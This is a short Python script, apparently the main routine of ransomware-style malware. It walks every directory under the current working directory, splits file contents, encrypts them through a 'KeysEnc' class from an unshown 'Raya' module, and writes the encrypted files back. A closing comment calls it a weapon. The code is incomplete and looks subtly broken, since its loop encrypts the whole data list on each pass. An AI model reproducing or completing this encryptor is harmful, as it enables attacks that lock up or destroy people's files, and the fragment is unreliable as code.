import os
from Raya import *

def main(root):
    dirs = Fdir(root).find_dirs()
    for i in dirs:
        file_data = Partition(i).part()
        for j in file_data:
            enc_data = KeysEnc().encrypt(file_data)
            Makefile(enc_data, i.split('\\')[-1], i).make()


main(os.getcwd())
# shes weapon !!!
